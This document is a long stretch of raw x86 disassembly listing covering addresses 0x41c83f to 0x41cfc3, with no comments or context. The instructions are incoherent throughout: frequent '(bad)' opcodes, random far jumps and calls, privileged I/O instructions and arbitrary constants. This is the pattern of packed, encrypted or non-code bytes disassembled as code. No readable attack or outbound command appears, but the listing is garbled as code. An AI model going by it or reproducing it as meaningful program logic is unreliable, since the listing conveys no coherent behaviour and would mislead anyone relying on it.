  41c83f:	cs enter 0x6e66,0x7a
  41c844:	ins    BYTE PTR es:[edi],dx
  41c845:	lock fld TBYTE PTR [eax+0x49]
  41c849:	clc    
  41c84a:	jp     0x41c82b
  41c84c:	lds    eax,FWORD PTR [ebx]
  41c84e:	jo     0x41c84c
  41c850:	or     BYTE PTR [ebx-0x41],dl
  41c853:	(bad)  
  41c854:	dec    ebx
  41c855:	(bad)  
  41c856:	sbb    al,0xb2
  41c858:	add    eax,0x66ddd546
  41c85d:	push   cs
  41c85e:	iret   
  41c85f:	stos   BYTE PTR es:[edi],al
  41c860:	into   
  41c861:	push   esi
  41c862:	adc    al,BYTE PTR [ebp-0x61]
  41c865:	call   0x7d4d:0x108ac363
  41c86c:	(bad)  
  41c86d:	xor    ch,BYTE PTR [eax-0x2f]
  41c870:	xchg   ebp,eax
  41c871:	int3   
  41c872:	ja     0x41c8f3
  41c874:	pop    ecx
  41c875:	or     DWORD PTR gs:[edi-0x3e],edi
  41c879:	hlt    
  41c87a:	push   ebx
  41c87b:	sub    dl,dh
  41c87d:	mov    cl,0xfc
  41c87f:	out    dx,al
  41c880:	cmp    edx,ebx
  41c882:	dec    BYTE PTR [edx]
  41c884:	dec    ax
  41c886:	sub    edx,0x4
  41c889:	add    dl,bh
  41c88b:	mov    ds:0xa2b564fc,al
  41c890:	outs   dx,DWORD PTR ds:[esi]
  41c891:	sbb    BYTE PTR [ebp+0xc53ddf3],bl
  41c897:	dec    ebx
  41c898:	inc    ebx
  41c899:	push   es
  41c89a:	push   cs
  41c89b:	mov    edi,0xb3f183e2
  41c8a0:	inc    ecx
  41c8a1:	cmp    dh,cl
  41c8a3:	and    bl,BYTE PTR [ebp-0x78]
  41c8a6:	mov    ebx,0xc6227df9
  41c8ab:	sub    dh,al
  41c8ad:	add    DWORD PTR [ebx-0x7a],edi
  41c8b0:	loopne 0x41c8ba
  41c8b2:	daa    
  41c8b3:	mov    esi,0x83d097cb
  41c8b8:	sub    ebx,esp
  41c8ba:	push   ds
  41c8bb:	mov    dl,0xa
  41c8bd:	jge    0x41c8b8
  41c8bf:	ins    DWORD PTR es:[edi],dx
  41c8c0:	cli    
  41c8c1:	shl    BYTE PTR [ecx],cl
  41c8c3:	hlt    
  41c8c4:	add    BYTE PTR [ebx],bl
  41c8c6:	mov    edx,0x870a4086
  41c8cb:	pushf  
  41c8cc:	(bad)  
  41c8cd:	retf   
  41c8ce:	jp     0x41c8fc
  41c8d0:	jge    0x41c8a7
  41c8d2:	xor    al,0xb7
  41c8d4:	xor    eax,0x4ec6a8e3
  41c8d9:	dec    edx
  41c8da:	(bad)  
  41c8db:	push   ds
  41c8dc:	push   ebx
  41c8dd:	push   es
  41c8de:	dec    esi
  41c8df:	data16 jns 0x41c8f2
  41c8e2:	or     al,0x8
  41c8e4:	inc    edi
  41c8e5:	sub    DWORD PTR [esi],ecx
  41c8e7:	adc    eax,0x49e76f15
  41c8ec:	fimul  DWORD PTR [ebx]
  41c8ee:	mov    esp,0x29ff463
  41c8f3:	push   ecx
  41c8f4:	jmp    0xfde4908f
  41c8f9:	popa   
  41c8fa:	outs   dx,BYTE PTR ds:[esi]
  41c8fb:	mov    ebx,0x212c19d4
  41c900:	test   esi,ebp
  41c902:	push   cs
  41c903:	sub    DWORD PTR [edi-0xfabb4d5],esi
  41c909:	mov    ds,WORD PTR [ebx+0x3b]
  41c90c:	loopne 0x41c922
  41c90e:	lock mov bh,0xab
  41c911:	pop    eax
  41c912:	xchg   edx,eax
  41c913:	enter  0xc945,0xc0
  41c917:	adc    BYTE PTR [edx+0x6a3d2e65],ch
  41c91d:	fsubrp st(5),st
  41c91f:	je     0x41c8a1
  41c921:	xor    esi,DWORD PTR [eax+edi*1-0x7b]
  41c925:	mov    gs,WORD PTR [ecx+ebp*4+0x55]
  41c929:	call   0x48f3ce7f
  41c92e:	and    al,0x5e
  41c930:	mov    eax,0x2689e1f3
  41c935:	pop    ds
  41c936:	jnp    0x41c9b0
  41c938:	inc    esp
  41c939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c93a:	not    BYTE PTR [ecx-0x6a45c130]
  41c940:	loop   0x41c91a
  41c942:	sahf   
  41c943:	xchg   ebx,eax
  41c944:	pop    ebx
  41c945:	xchg   edx,eax
  41c946:	stc    
  41c947:	cs sbb eax,0x8c99695c
  41c94d:	sbb    cl,BYTE PTR [ebp+esi*2+0x26]
  41c951:	adc    al,0xcc
  41c953:	(bad)  
  41c954:	sahf   
  41c955:	xor    ebx,ebx
  41c957:	sub    DWORD PTR [edx-0x78b5e31f],edi
  41c95d:	arpl   WORD PTR [edx-0x6c],si
  41c960:	clc    
  41c961:	loope  0x41c93d
  41c963:	dec    edi
  41c964:	xchg   ebp,eax
  41c965:	fbstp  TBYTE PTR [edi-0x59]
  41c968:	or     ch,cl
  41c96a:	clc    
  41c96b:	mov    DWORD PTR [ebp+0x350d5c4a],eax
  41c971:	mov    ch,BYTE PTR [ebx+edi*4+0x41]
  41c975:	jne    0x41c998
  41c977:	repz sub DWORD PTR [edi-0xd],ebp
  41c97b:	or     al,0xd9
  41c97d:	lahf   
  41c97e:	in     eax,0x33
  41c980:	xchg   BYTE PTR [esi+0x28dbbf2d],al
  41c986:	mov    esi,0x32595426
  41c98b:	pop    ds
  41c98c:	xchg   ebp,eax
  41c98d:	jg     0x41c941
  41c98f:	xor    BYTE PTR [eax+0xc9e4dce],bh
  41c995:	dec    esi
  41c996:	cld    
  41c997:	jl     0x41c9c6
  41c999:	div    BYTE PTR [edi+0x5fe0e2fc]
  41c99f:	pop    esi
  41c9a0:	mov    ch,0x7e
  41c9a2:	iret   
  41c9a3:	ds or  BYTE PTR cs:[edx-0x20],bl
  41c9a8:	mov    DWORD PTR ds:[ebp-0x238dd702],ecx
  41c9af:	sbb    DWORD PTR [ecx+0x2c],0x6349d7f1
  41c9b6:	stos   DWORD PTR es:[edi],eax
  41c9b7:	adc    DWORD PTR [edi+0x27],edx
  41c9ba:	inc    edx
  41c9bb:	cmp    esi,edi
  41c9bd:	push   es
  41c9be:	xchg   esp,eax
  41c9bf:	retf   0xba34
  41c9c2:	outs   dx,DWORD PTR ds:[esi]
  41c9c3:	aad    0x4f
  41c9c5:	mov    al,ds:0xde23d45d
  41c9ca:	jmp    0x4ecb:0xfb96632b
  41c9d1:	dec    edi
  41c9d2:	sbb    BYTE PTR [edx+0x1382bf21],0x89
  41c9d9:	shr    DWORD PTR [edx+0x50d4be3f],0x39
  41c9e0:	in     al,0xeb
  41c9e2:	jecxz  0x41ca36
  41c9e4:	lock arpl WORD PTR [eax-0x2fbed04a],dx
  41c9eb:	adc    dh,BYTE PTR [ebx]
  41c9ed:	mov    ds:0x908466df,eax
  41c9f2:	(bad)  
  41c9f4:	add    eax,0xfbaa4cc
  41c9f9:	shl    esp,1
  41c9fb:	out    dx,al
  41c9fc:	adc    ecx,DWORD PTR [eax+0x1cbcb40e]
  41ca02:	mov    DWORD PTR [ebp+0x60],ecx
  41ca05:	arpl   WORD PTR [edi+0x56],bx
  41ca08:	xor    eax,DWORD PTR [ebp-0x2b]
  41ca0b:	lea    esi,[ecx]
  41ca0d:	jb     0x41c9f4
  41ca0f:	push   ecx
  41ca10:	loope  0x41ca4c
  41ca12:	xor    al,0xc2
  41ca14:	mov    ebp,0xe5a15554
  41ca19:	cmp    al,BYTE PTR [ebp-0x35]
  41ca1c:	jmp    0x8a4f:0xbac56a94
  41ca23:	data16 mov dh,0x85
  41ca26:	inc    esp
  41ca27:	inc    ebx
  41ca28:	bound  ecx,QWORD PTR [ebp-0x6c]
  41ca2b:	mov    al,ds:0x6d791542
  41ca30:	in     al,0xd7
  41ca32:	adc    al,0xcd
  41ca34:	mov    ebp,0x65ba7db5
  41ca39:	les    edx,FWORD PTR [edi-0x7502152a]
  41ca3f:	add    BYTE PTR [esp+ebp*8+0x64d33136],ah
  41ca46:	jecxz  0x41ca2d
  41ca48:	arpl   WORD PTR ds:0x4dba1112,ax
  41ca4e:	jg     0x41cab0
  41ca50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca51:	std    
  41ca52:	pop    ecx
  41ca53:	loopne 0x41ca3e
  41ca55:	cmp    eax,0xe786d98a
  41ca5a:	xchg   ebx,eax
  41ca5b:	hlt    
  41ca5c:	lea    esp,[esi]
  41ca5e:	ret    0x3968
  41ca61:	push   0xffffff8c
  41ca63:	xchg   ebp,eax
  41ca64:	outs   dx,DWORD PTR fs:[esi]
  41ca66:	add    ecx,DWORD PTR [ebp-0x1]
  41ca69:	mov    eax,ds:0xae040a95
  41ca6e:	test   al,0xbe
  41ca70:	loopne 0x41caf0
  41ca72:	dec    edx
  41ca73:	jmp    0xab9ed33e
  41ca78:	pushf  
  41ca79:	jmp    0x159c:0xbcf754ac
  41ca80:	mov    bh,0x9d
  41ca82:	fucomip st,st(5)
  41ca84:	pop    esp
  41ca85:	push   ds
  41ca86:	xchg   edx,eax
  41ca87:	push   esp
  41ca89:	pushf  
  41ca8a:	adc    esi,DWORD PTR [esi]
  41ca8c:	(bad)  
  41ca8d:	popa   
  41ca8e:	add    DWORD PTR [edx-0x4],ebx
  41ca91:	call   DWORD PTR [ebx+0x60]
  41ca94:	bound  ebx,QWORD PTR [eax-0x4281823c]
  41ca9a:	mov    eax,0xbb595c0f
  41ca9f:	add    BYTE PTR [ecx-0x47],0xf8
  41caa3:	data16 repnz fcmovne st,st(7)
  41caa7:	inc    ebx
  41caa8:	fnstcw WORD PTR [ebp+0x33]
  41caab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41caac:	aaa    
  41caad:	lods   eax,DWORD PTR ds:[esi]
  41caae:	fdivr  st,st(4)
  41cab0:	push   esp
  41cab1:	jnp    0x41ca79
  41cab3:	fdivr  QWORD PTR [eax]
  41cab5:	add    DWORD PTR [edx+ebx*1-0x1a],eax
  41cab9:	jle    0x41ca4a
  41cabb:	not    BYTE PTR [esi]
  41cabd:	es push cs
  41cabf:	rol    DWORD PTR [esi],1
  41cac1:	rcr    DWORD PTR [ebx+0x65],1
  41cac4:	jmp    0x41ca62
  41cac6:	into   
  41cac7:	xor    ch,BYTE PTR [esi]
  41cac9:	adc    DWORD PTR [edi-0x49],ebp
  41cacc:	pop    esp
  41cacd:	or     al,0x4d
  41cacf:	je     0x41caf1
  41cad1:	xor    DWORD PTR [ebx],ebp
  41cad3:	cmp    bl,ah
  41cad5:	mov    WORD PTR [ecx-0x5eb06030],cs
  41cadb:	mov    ch,BYTE PTR [esi]
  41cadd:	bnd jne 0x41cb31
  41cae0:	dec    ebp
  41cae1:	stc    
  41cae2:	test   al,0x1b
  41cae4:	cli    
  41cae5:	(bad)  
  41cae6:	call   0x8134c2a9
  41caeb:	jmp    0x6879:0x2d0ae611
  41caf2:	or     esp,DWORD PTR [esi]
  41caf4:	adc    DWORD PTR [eax],edx
  41caf6:	push   0xffffffbb
  41caf8:	pusha  
  41caf9:	xchg   esi,eax
  41cafa:	pop    ss
  41cafb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafc:	pop    ebx
  41cafd:	sbb    al,0xb5
  41caff:	mov    esi,0xd325c991
  41cb04:	mov    edx,0x6369d83d
  41cb09:	pop    esp
  41cb0a:	sub    ecx,DWORD PTR [edi-0x41]
  41cb0d:	outs   dx,DWORD PTR ds:[esi]
  41cb0e:	cs xor DWORD PTR gs:[edi+0xd],0x57ee7da2
  41cb17:	rol    DWORD PTR [esp+ecx*8],0xed
  41cb1b:	and    BYTE PTR [ebp-0x788e91ed],bl
  41cb21:	jo     0x41cace
  41cb23:	push   ss
  41cb24:	mov    al,ds:0x6e0b8512
  41cb29:	xchg   edx,eax
  41cb2a:	mov    DWORD PTR fs:[esi-0x7b12426e],ecx
  41cb31:	inc    esp
  41cb32:	loopne 0x41cba0
  41cb34:	shl    DWORD PTR [ebx+0x146f3a6c],cl
  41cb3a:	sub    ecx,DWORD PTR [ecx]
  41cb3c:	mov    dh,BYTE PTR [edi-0x68a06fde]
  41cb42:	fstp   QWORD PTR [edx-0x5a94b002]
  41cb48:	add    al,BYTE PTR [edx]
  41cb4a:	and    DWORD PTR [edi],ebx
  41cb4c:	add    dl,al
  41cb4e:	cmp    al,0xa3
  41cb50:	sbb    eax,0x9b16caae
  41cb55:	ins    BYTE PTR es:[edi],dx
  41cb56:	mov    esp,0x7be08ffc
  41cb5b:	outs   dx,BYTE PTR ds:[esi]
  41cb5c:	dec    edi
  41cb5d:	aaa    
  41cb5e:	inc    eax
  41cb5f:	xchg   edx,eax
  41cb60:	enter  0x5143,0x69
  41cb64:	(bad)  
  41cb65:	lods   al,BYTE PTR ds:[esi]
  41cb66:	dec    ecx
  41cb67:	inc    ecx
  41cb68:	shl    DWORD PTR [eax-0x62d32b1],1
  41cb6e:	mov    ah,0x74
  41cb70:	push   ebx
  41cb71:	mov    ds:0x2daaef32,al
  41cb76:	jnp    0x41cb7d
  41cb78:	test   DWORD PTR [edx+0x4b],eax
  41cb7b:	mov    ebp,0x2a1a54bd
  41cb80:	fdiv   QWORD PTR [ebx]
  41cb82:	loope  0x41cbf8
  41cb84:	xchg   edi,eax
  41cb85:	and    esi,eax
  41cb87:	test   BYTE PTR [edx+0x635cc05b],bh
  41cb8d:	add    edi,esi
  41cb8f:	pop    ds
  41cb90:	mov    edi,0x4ce2b77b
  41cb95:	jp     0x41cc01
  41cb97:	ret    0xf6c3
  41cb9a:	xchg   BYTE PTR [ebp+0x331fce73],dh
  41cba0:	sub    al,0x27
  41cba2:	jno    0x41cbc7
  41cba4:	inc    esp
  41cba5:	pop    es
  41cba6:	dec    esi
  41cba7:	call   0x9b70b3a6
  41cbac:	pusha  
  41cbad:	cmp    BYTE PTR [eax+0x14028ed3],dl
  41cbb3:	and    BYTE PTR [edx-0x25cfa27d],bl
  41cbb9:	inc    esi
  41cbba:	bsf    ebx,DWORD PTR [ebp+0x78e58988]
  41cbc1:	call   0x94b3:0x94f1b3d4
  41cbc8:	aam    0xb3
  41cbca:	dec    edi
  41cbcb:	call   0xa5b66d77
  41cbd0:	mov    ebx,0x49a727fd
  41cbd5:	cmp    dh,BYTE PTR [ebx+eax*2]
  41cbd8:	fwait
  41cbd9:	test   BYTE PTR [ebx-0x3a1c4513],bl
  41cbdf:	push   edx
  41cbe0:	or     BYTE PTR [ebp+0x2a],ch
  41cbe3:	gs cdq 
  41cbe5:	add    DWORD PTR [eax-0x26],esi
  41cbe8:	stos   BYTE PTR es:[edi],al
  41cbe9:	xchg   edi,eax
  41cbea:	sub    BYTE PTR [esi+0x24a9cc46],cl
  41cbf0:	ficom  WORD PTR [edx+0x4d]
  41cbf3:	cmp    edi,DWORD PTR [esi-0x768434ee]
  41cbf9:	jbe    0x41cc2c
  41cbfb:	scas   al,BYTE PTR es:[edi]
  41cbfc:	mov    ds:0xa96e4374,al
  41cc01:	push   edx
  41cc02:	xchg   ebx,edi
  41cc04:	into   
  41cc05:	cmp    esi,DWORD PTR [ecx-0x6740df97]
  41cc0b:	mov    ebp,0x1be648f0
  41cc10:	out    0xb,al
  41cc12:	jge    0x41cc21
  41cc14:	mov    al,0xdb
  41cc16:	xor    al,0x35
  41cc18:	pop    esp
  41cc19:	add    BYTE PTR [edx],ch
  41cc1b:	(bad)  
  41cc1c:	and    al,0xf1
  41cc1e:	sbb    ah,BYTE PTR [edx+0x1e]
  41cc21:	inc    ebx
  41cc22:	neg    BYTE PTR [edx]
  41cc24:	call   0x857799b8
  41cc29:	fistp  QWORD PTR [ebx+0x1f]
  41cc2c:	xchg   ecx,eax
  41cc2d:	mov    ch,0x4c
  41cc2f:	and    eax,0xa1646f73
  41cc34:	ret    
  41cc35:	cmp    ebx,DWORD PTR [ebx-0x682f437c]
  41cc3b:	add    eax,0x6ba11691
  41cc40:	je     0x41cc62
  41cc42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cc43:	xchg   ecx,ecx
  41cc45:	out    dx,eax
  41cc46:	sub    esp,esp
  41cc48:	hlt    
  41cc49:	jno    0x41ccb4
  41cc4b:	or     ch,BYTE PTR [eax+0x50967a0f]
  41cc51:	daa    
  41cc52:	mov    ebp,0x695fd542
  41cc57:	mov    dh,0xf3
  41cc59:	scas   al,BYTE PTR es:[edi]
  41cc5a:	cmp    al,0xe7
  41cc5c:	mov    al,ds:0x83abc146
  41cc61:	fwait
  41cc62:	pop    ebp
  41cc63:	push   eax
  41cc64:	nop
  41cc65:	dec    ebx
  41cc66:	xchg   edi,eax
  41cc67:	xlat   BYTE PTR ds:[ebx]
  41cc68:	stos   DWORD PTR es:[edi],eax
  41cc69:	jb     0x41cc88
  41cc6b:	inc    edx
  41cc6c:	lea    ebx,[ebx]
  41cc6e:	push   cs
  41cc6f:	mov    edi,0xa7e14920
  41cc74:	jns    0x41cc94
  41cc76:	fldenv [ecx]
  41cc78:	xor    DWORD PTR [eax+0x69],0x93d90868
  41cc7f:	push   esi
  41cc80:	or     eax,0xc71c7277
  41cc85:	enter  0x5eed,0x1d
  41cc89:	and    al,0xb2
  41cc8b:	mov    dh,0x23
  41cc8d:	xchg   esi,eax
  41cc8e:	iret   
  41cc8f:	xchg   esp,eax
  41cc90:	sbb    cl,BYTE PTR [eax+eiz*8]
  41cc93:	inc    edx
  41cc94:	sbb    esi,DWORD PTR [ecx-0x7a]
  41cc97:	dec    esi
  41cc98:	pop    esi
  41cc99:	loope  0x41cc5e
  41cc9b:	push   cs
  41cc9c:	mov    dl,0x4c
  41cc9e:	xor    DWORD PTR [ebx],ebp
  41cca0:	push   ss
  41cca1:	je     0x41cc6e
  41cca3:	jbe    0x41ccec
  41cca5:	or     DWORD PTR [ebp-0x58e3f16e],ebp
  41ccab:	popa   
  41ccac:	cmp    eax,DWORD PTR [edx]
  41ccae:	je     0x41ccd9
  41ccb0:	out    dx,eax
  41ccb1:	add    BYTE PTR [ebx-0x667523c],bh
  41ccb7:	mov    ecx,0x9704f3e0
  41ccbc:	call   0xd910:0xc834e040
  41ccc3:	jae    0x41cc55
  41ccc5:	mov    ah,0x64
  41ccc7:	sub    eax,0x3408e4d7
  41cccc:	loop   0x41cc6d
  41ccce:	hlt    
  41cccf:	xor    al,0xeb
  41ccd1:	fidiv  DWORD PTR [ebx]
  41ccd3:	or     ebx,eax
  41ccd5:	cmp    ah,BYTE PTR [esi-0x78]
  41ccd8:	inc    ebp
  41ccd9:	adc    al,0x99
  41ccdb:	into   
  41ccdc:	cmp    al,BYTE PTR [ebp*4-0x571b2b85]
  41cce3:	inc    edi
  41cce4:	test   al,0xb0
  41cce6:	loopne 0x41ccb3
  41cce8:	cmp    DWORD PTR [ecx+0x70],ecx
  41cceb:	xor    eax,0x2e5c2be5
  41ccf0:	stos   DWORD PTR es:[edi],eax
  41ccf1:	jle    0x41cce4
  41ccf3:	sti    
  41ccf4:	or     bl,BYTE PTR [edi+0x5]
  41ccf7:	push   ecx
  41ccf8:	shr    ah,0xe3
  41ccfb:	xchg   ebp,eax
  41ccfc:	jmp    0x41ccf5
  41ccfe:	sbb    eax,0xb029eebd
  41cd03:	jecxz  0x41cd23
  41cd05:	pop    ds
  41cd06:	pop    ecx
  41cd07:	mov    cl,0x51
  41cd09:	pop    ss
  41cd0a:	sar    BYTE PTR [edx],1
  41cd0c:	in     eax,dx
  41cd0d:	ror    BYTE PTR [edx+0x53d9a9e1],1
  41cd13:	push   esi
  41cd14:	aad    0x71
  41cd16:	pop    esp
  41cd17:	retf   0xee8c
  41cd1a:	outs   dx,BYTE PTR ds:[esi]
  41cd1b:	mov    ss,WORD PTR [esi+0x3a]
  41cd1e:	or     BYTE PTR [ecx-0x4],al
  41cd21:	not    bl
  41cd23:	push   0xffffffae
  41cd25:	xor    BYTE PTR [ecx],al
  41cd27:	loopne 0x41ccba
  41cd29:	test   eax,0xce3ab19b
  41cd2e:	inc    esp
  41cd2f:	inc    edi
  41cd30:	xchg   DWORD PTR [ebx+ebp*2+0x27722c3d],ebx
  41cd37:	fistp  DWORD PTR [ecx-0x3ed828e6]
  41cd3d:	mov    dh,0xa2
  41cd3f:	mov    eax,ds:0x1948b91e
  41cd44:	add    al,BYTE PTR [esi+0x56de2802]
  41cd4a:	data16 aas 
  41cd4c:	push   esp
  41cd4d:	icebp  
  41cd4e:	sub    eax,0x9b634d6d
  41cd53:	cmp    ebx,DWORD PTR [ecx]
  41cd55:	cmc    
  41cd56:	icebp  
  41cd57:	ins    BYTE PTR es:[edi],dx
  41cd58:	out    dx,al
  41cd59:	inc    edx
  41cd5a:	lock xchg ebp,eax
  41cd5c:	call   0x6aedb5f5
  41cd61:	and    dh,BYTE PTR [edx+0x1526e04c]
  41cd67:	pop    edi
  41cd68:	mov    edx,0x5d87a655
  41cd6d:	jo     0x41cd95
  41cd6f:	bound  ebx,QWORD PTR [esi-0xfa68e9e]
  41cd75:	mov    dl,0xea
  41cd77:	(bad)  
  41cd78:	(bad)  
  41cd79:	add    BYTE PTR [esi+0x2701b2d7],ch
  41cd7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd80:	call   0x390aa6ef
  41cd85:	dec    esp
  41cd86:	mov    esp,0x2544f35c
  41cd8b:	shl    dh,1
  41cd8d:	dec    ebx
  41cd8e:	or     dl,BYTE PTR [ebp-0x57]
  41cd91:	xlat   BYTE PTR ds:[ebx]
  41cd92:	sbb    eax,0x5fcba9d
  41cd97:	repz hlt 
  41cd99:	or     ecx,esi
  41cd9b:	retf   0x224c
  41cd9e:	sbb    BYTE PTR [eax],0x31
  41cda1:	jecxz  0x41cd29
  41cda3:	inc    ebx
  41cda4:	and    ebp,DWORD PTR [eax]
  41cda6:	lods   al,BYTE PTR ds:[esi]
  41cda7:	mov    ds:0x8a44265c,al
  41cdac:	adc    eax,0xfbd81b7c
  41cdb1:	add    cl,BYTE PTR [eax-0x10]
  41cdb4:	popf   
  41cdb5:	mov    ebp,0x54a4cdb
  41cdba:	fs jmp 0x41cde0
  41cdbd:	mov    dh,0x2c
  41cdbf:	mov    al,0x1d
  41cdc1:	push   ds
  41cdc2:	push   es
  41cdc3:	mov    edx,0xfeb79f3b
  41cdc8:	sbb    BYTE PTR [eax-0x4f],dl
  41cdcb:	dec    ebp
  41cdcc:	add    al,0xec
  41cdce:	das    
  41cdcf:	in     al,0xf9
  41cdd1:	sbb    ebx,DWORD PTR [edi+0x67]
  41cdd4:	fcomp  st(6)
  41cdd6:	mov    BYTE PTR [edx],al
  41cdd8:	sbb    edx,esi
  41cdda:	out    dx,al
  41cddb:	cmp    ecx,0x920840a9
  41cde1:	xchg   ebp,eax
  41cde2:	push   ecx
  41cde3:	pop    edi
  41cde4:	push   ebx
  41cde5:	sub    eax,0xb5816ff
  41cdea:	gs pop ebp
  41cdec:	aam    0x70
  41cdee:	pop    eax
  41cdef:	out    0xd2,eax
  41cdf1:	in     eax,dx
  41cdf2:	or     esp,DWORD PTR [eax+0x12]
  41cdf5:	(bad)  
  41cdf6:	xlat   BYTE PTR ds:[ebx]
  41cdf7:	imul   esp,ebx,0xffffff87
  41cdfa:	xchg   edx,eax
  41cdfb:	arpl   cx,bx
  41cdfd:	cmc    
  41cdfe:	sbb    ebp,DWORD PTR [eax+0x19]
  41ce01:	lds    edi,FWORD PTR [ebp+ebx*2-0x66]
  41ce05:	sub    ebp,DWORD PTR [eax+0x392afda9]
  41ce0b:	loope  0x41cde8
  41ce0d:	dec    ebp
  41ce0e:	les    edx,FWORD PTR [eax]
  41ce10:	add    esp,DWORD PTR [esi-0x1c42cea6]
  41ce16:	es loopne 0x41ce71
  41ce19:	push   0xb053f218
  41ce1e:	sub    ebx,DWORD PTR [ebx+0x276cd75c]
  41ce24:	fisubr WORD PTR [ebx+0x31c1f819]
  41ce2a:	mov    bl,0xf
  41ce2c:	sub    cl,dl
  41ce2e:	jb     0x41cde9
  41ce30:	ret    0x54dd
  41ce33:	pop    esp
  41ce34:	xchg   edx,eax
  41ce35:	fxch   st(3)
  41ce37:	xor    edx,ebx
  41ce39:	jge    0x41ce72
  41ce3b:	and    esi,edx
  41ce3d:	jle    0x41ce59
  41ce3f:	add    bl,bl
  41ce41:	and    al,0xe7
  41ce43:	js     0x41ce12
  41ce45:	mov    esi,0xc42ba01e
  41ce4a:	adc    al,0xe3
  41ce4c:	je     0x41ce81
  41ce4e:	xor    BYTE PTR [eax-0x7],0xcb
  41ce52:	test   DWORD PTR [edi+0x450c8e75],ebp
  41ce58:	rol    edi,1
  41ce5a:	in     eax,0x5d
  41ce5c:	jmp    0xf0d9:0x939801f8
  41ce63:	and    eax,DWORD PTR [eax]
  41ce65:	(bad)  
  41ce66:	cld    
  41ce67:	popa   
  41ce68:	fwait
  41ce69:	sub    DWORD PTR [esi+0x50],edi
  41ce6c:	mov    ds:0xe04c45f3,al
  41ce71:	add    BYTE PTR [esi-0x65],cl
  41ce74:	and    eax,0xeaa961c1
  41ce79:	xor    BYTE PTR [ecx],ch
  41ce7b:	and    DWORD PTR [edx+0x6b],0x3f
  41ce7f:	daa    
  41ce80:	call   0x8c8e:0xf5571e29
  41ce87:	and    ebp,ebp
  41ce89:	jp     0x41ce0b
  41ce8b:	shr    DWORD PTR [edi-0x3c],0x27
  41ce8f:	repz jbe 0x41ced3
  41ce92:	jge    0x41ceb8
  41ce94:	(bad)  
  41ce95:	ficomp DWORD PTR [ecx+0x42f0dc43]
  41ce9b:	(bad)  
  41ce9c:	jge    0x41ce25
  41ce9e:	(bad)  
  41ce9f:	cmp    DWORD PTR [eax+eax*4-0x273b24e1],edx
  41cea6:	jo     0x41ce41
  41cea8:	jnp    0x41ce41
  41ceaa:	repz push DWORD PTR [esi+0x374b795e]
  41ceb1:	xchg   edi,eax
  41ceb2:	inc    eax
  41ceb3:	push   ss
  41ceb4:	mov    ch,0x47
  41ceb6:	pop    ebx
  41ceb7:	das    
  41ceb8:	push   ds
  41ceb9:	mov    ds:0x660e64de,al
  41cebe:	sbb    al,0x62
  41cec0:	(bad)  
  41cec1:	xchg   edi,eax
  41cec2:	ins    BYTE PTR es:[edi],dx
  41cec3:	cmp    al,BYTE PTR [edi]
  41cec5:	les    esi,FWORD PTR [ecx+0xa]
  41cec8:	mov    dh,0x43
  41ceca:	push   ss
  41cecb:	push   0x44
  41cecd:	fsub   QWORD PTR [esi+0x5fa34a61]
  41ced3:	mov    esi,0x3ebe1242
  41ced8:	in     eax,0xf1
  41ceda:	push   cs
  41cedb:	mov    eax,0xb03a3305
  41cee0:	out    0x4b,al
  41cee2:	jnp    0x41cf3e
  41cee4:	push   ebp
  41cee5:	cmp    eax,0xbdd416b8
  41ceea:	jge    0x41cf17
  41ceec:	ds jnp 0x41cec5
  41ceef:	cdq    
  41cef0:	mov    ds:0x8436bc54,eax
  41cef5:	sbb    al,0x11
  41cef7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cef8:	and    eax,0xd4d6b65a
  41cefd:	adc    eax,0xfc831759
  41cf02:	cmp    ecx,DWORD PTR [ebp+0x7b437050]
  41cf08:	add    ebx,esp
  41cf0a:	sbb    WORD PTR [ebp-0x6f5e8830],bp
  41cf11:	push   ebx
  41cf12:	pop    edx
  41cf13:	test   DWORD PTR ds:0xffd2bc47,0xc63aad49
  41cf1d:	adc    al,0xfd
  41cf1f:	add    al,0xc7
  41cf21:	ss addr16 pop ds
  41cf24:	and    BYTE PTR [ecx-0x7bf5b6bb],bl
  41cf2a:	les    ecx,FWORD PTR [ebp+0x26]
  41cf2d:	jo     0x41cf88
  41cf2f:	es call 0xafeb:0x6bc87a13
  41cf37:	mov    dh,0xbc
  41cf39:	fnstenv [edi]
  41cf3b:	xor    ebp,DWORD PTR [ebx+ebx*2+0x5b9806d2]
  41cf42:	ret    0x7b23
  41cf45:	dec    edi
  41cf46:	jae    0x41cef4
  41cf48:	ret    0x2d6c
  41cf4b:	out    dx,eax
  41cf4c:	test   DWORD PTR ds:0x6c945540,esi
  41cf52:	inc    edx
  41cf53:	add    esp,DWORD PTR [eax]
  41cf55:	sub    BYTE PTR [edx+0x54399517],ah
  41cf5b:	mov    al,0x2d
  41cf5d:	xor    eax,0xc927743d
  41cf62:	add    edx,esp
  41cf64:	pop    ss
  41cf65:	int3   
  41cf66:	and    al,0xef
  41cf68:	ins    DWORD PTR es:[edi],dx
  41cf69:	in     al,dx
  41cf6a:	ret    0x96c6
  41cf6d:	sbb    DWORD PTR [edi-0x60bab438],0xffffff80
  41cf74:	dec    edx
  41cf75:	and    ah,BYTE PTR [edx]
  41cf77:	pop    ebx
  41cf78:	sbb    DWORD PTR [edx+edx*1+0x46],eax
  41cf7c:	xchg   DWORD PTR [eax+0x6e5ca84d],edx
  41cf82:	call   0x7de62b2f
  41cf87:	and    eax,DWORD PTR [edi+0x67]
  41cf8a:	out    dx,eax
  41cf8b:	enter  0x29f9,0x24
  41cf8f:	std    
  41cf90:	ja     0x41cf96
  41cf92:	rcr    BYTE PTR [edx-0x4e49f814],1
  41cf98:	pop    ebx
  41cf99:	sub    DWORD PTR [ecx],esi
  41cf9b:	fnstsw WORD PTR [esi+eax*1+0x5]
  41cf9f:	adc    DWORD PTR [ecx+0x32],ebx
  41cfa2:	jae    0x41d01e
  41cfa4:	adc    edi,DWORD PTR [esi]
  41cfa6:	ins    BYTE PTR es:[edi],dx
  41cfa7:	mov    eax,0x97a0e68f
  41cfac:	xor    edx,DWORD PTR ds:0x9e8632bd
  41cfb2:	adc    DWORD PTR [edi+0x1c],esi
  41cfb5:	aad    0xca
  41cfb7:	rcr    BYTE PTR ds:0x50a2bcdb,1
  41cfbd:	adc    ebx,esi
  41cfbf:	fisttp QWORD PTR [eax]
  41cfc1:	sysret 
  41cfc3:	and    eax,0xbb6937bd
